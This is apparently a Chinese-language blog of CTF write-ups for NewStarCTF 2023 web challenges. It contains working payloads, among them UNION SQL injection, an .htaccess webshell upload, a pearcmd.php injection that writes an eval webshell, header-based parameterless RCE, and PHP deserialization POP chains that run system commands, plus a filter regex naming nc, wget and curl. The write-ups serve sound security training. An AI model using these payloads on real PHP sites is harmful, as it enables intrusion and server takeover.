<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Begin-of-PHP" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Begin of PHP</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704113457445.png" class="" title="image-20250704113457445">

<p>å…¨éƒ¨ä½¿ç”¨æ•°ç»„ç»•è¿‡å³å¯</p>
<p>key1[]&#x3D;1<br>&amp;key2[]&#x3D;2<br>&amp;key4[]&#x3D;1<br>&amp;key5[]&#x3D;2024</p>
<p>key3[]&#x3D;1&amp;flag5[]&#x3D;.</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ³„æ¼çš„ç§˜å¯†</h1><p>robots.txtå­˜åœ¨ä¸€åŠflagï¼Œæ‰«å‡ºç½‘ç«™å¤‡ä»½<a target="_blank" rel="noopener" href="http://www.zipå¾—åˆ°å¦ä¸€åŠ/">www.zipå¾—åˆ°å¦ä¸€åŠ</a></p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-ez-sql"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-ez-sql" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]ez_sql</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704143339398.png" class="" title="image-20250704143339398">

<p>æµ‹è¯•å­˜åœ¨wafå¯¹and orç­‰å…³é”®å­—éƒ½è¿›è¡Œäº†è¿‡æ»¤ ä½¿ç”¨å¤§å°å†™ç»•è¿‡å³å¯</p>
<p>?id&#x3D;-1â€™ UniOn seLect database(),2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA&#x3D; â€˜ctfâ€™â€“+</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704144113407.png" class="" title="image-20250704144113407">

<p><a target="_blank" rel="noopener" href="http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1">http://ff3d18d2-74a4-405a-a674-099ca58fd1b1.node5.buuoj.cn:81/?id=-1</a>â€˜ UniOn seLect database(),2,3,4,flag FROM here_is_flag â€“+</p>
<p>flag{f1cb957b-fa7d-4e98-b769-4b9c9f60f0e9}</p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Upload-again"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Upload-again" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Upload again!</h1><p>å¯¹æ–‡ä»¶åç¼€å’Œæ–‡ä»¶å†…å®¹å­˜åœ¨ä¸€å®šæƒ…å†µçš„è¿‡æ»¤</p>
<p>é…åˆ.htaccessæ–‡ä»¶ä¸Šä¼ ä»¥ä¸‹æœ¨é©¬å³å¯</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145512842.png" class="" title="image-20250704145512842">

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145620831.png" class="" title="image-20250704145620831">

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-æ¸¸æˆé«˜æ‰‹" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]æ¸¸æˆé«˜æ‰‹</h1><p>æŸ¥çœ‹æºä»£ç å‘ç°éœ€è¦gameScoreçš„å€¼å¤§äºä¸€å®šçš„æ•°æ‰ç»™flag</p>
<p>æ§åˆ¶å°ä¿®æ”¹æˆåŠŸ</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704151345043.png" class="" title="image-20250704151345043">

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Include-ğŸ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Include ğŸ</h1><p>æ ¹æ®æç¤ºè¯»å–phpinfo.phpæ–‡ä»¶æœç´¢flag</p>
<p>ç»™å‡ºæç¤ºæŸ¥çœ‹register_argc_argv</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704152432301.png" class="" title="image-20250704152432301">

<p>å‘ç°ä¸Šç½‘æŸ¥è¯¢èµ„æ–™å‘ç°register_argc_argvå¯ä»¥è¿›è¡Œrce</p>
<p>é€šè¿‡è°ƒç”¨pearcmd.phpè¿›è¡Œrce</p>
<p>register_argc_argvçš„ä¸¤ä¸ªç‰¹ç‚¹</p>
<p>1.&amp;ç¬¦æ— å‘åˆ†å‰²å‚æ•°ï¼ŒçœŸæ­£èƒ½åˆ†å‰²å‚æ•°çš„æ˜¯åŠ å·</p>
<p>2.ç­‰å·æ— æ³•èµ‹å€¼ï¼Œè€Œæ˜¯ä¼šç›´æ¥è¢«ä¼ è¿›å»å½“ä½œå‚æ•°</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" class="" title="image-20211101074033767.png">

<p>?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST['cmd']);?>+&#x2F;tmp&#x2F;test.php</p>
<p>æ¨¡æ‹ŸpearæŒ‡ä»¤åˆ›å»ºä¸€ä¸ªtest.phpçš„æœ¨é©¬æ–‡ä»¶</p>
<p>å‚è€ƒæ–‡ç« <a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿° - è·³è·³ç³–</a></p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-1"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-1" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!C!!E!!</h1><p>gitæ–‡ä»¶æ³„éœ²</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rcebo0g1pop.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;</span><br><span class="line">  if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;</span><br><span class="line">    eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ— å‚æ•°rce</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704201307267.png" class="" title="image-20250704201307267">

<p>å¯¹è¯·æ±‚å¤´è¿›è¡Œä¿®æ”¹å³å¯</p>
<p>eval(pos(array_reverse(getallheaders()))); </p>
<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-Unserializeï¼Ÿ" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]Unserializeï¼Ÿ</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// Maybe you need learn some knowledge about deserialize?</span><br><span class="line">class evil &#123;</span><br><span class="line">  private $cmd;</span><br><span class="line"></span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">    if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;</span><br><span class="line">      @system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç›´æ¥åºåˆ—åŒ–evilå³å¯</span><br><span class="line"></span><br><span class="line">æ³¨æ„privateå±æ€§éœ€è¦åœ¨å‰ååŠ å…¥%00</span><br><span class="line"></span><br><span class="line">unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;ca\t /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨\ç»•è¿‡æ­£åˆ™å³å¯</span><br></pre></td></tr></table></figure>



<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-2"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-R-C-E-2" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]R!!!C!!!E!!!</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705095556099.png" class="" title="image-20250705095556099">

<p>ååºåˆ—åŒ–åŠ rce</p>
<p>å®ä¾‹åŒ–å¯¹è±¡è§¦å‘ __destructä¹‹åå†è§¦å‘    tostring </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new minipop;</span><br><span class="line">$b = new minipop;</span><br><span class="line">$b -&gt; qwejaskdjnlka=$a;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å•å¼•å·ç»•è¿‡ç”¨teeå°†æŒ‡ä»¤æ‰§è¡Œç»“æœè¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag_is_h3eeere | t&#x27;&#x27;ee 1</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> -&gt; qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]POP Gadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>å‘ç°åœ¨whitegodä¸­å¯ä»¥è¿›è¡Œrce</p>
<p>æ„é€ popé“¾beginâ€”â€”&gt;thenâ€”-&gt;superâ€”-&gt;handleâ€”-&gt;ctfâ€”â€“&gt;whitegod</p>
<p>popé“¾</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>);</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-å…¬å¼€èµ›é“-More-Fast"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-More-Fast" class="headerlink" title="[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast"></a>[NewStarCTF 2023 å…¬å¼€èµ›é“]More Fast</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">      (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span 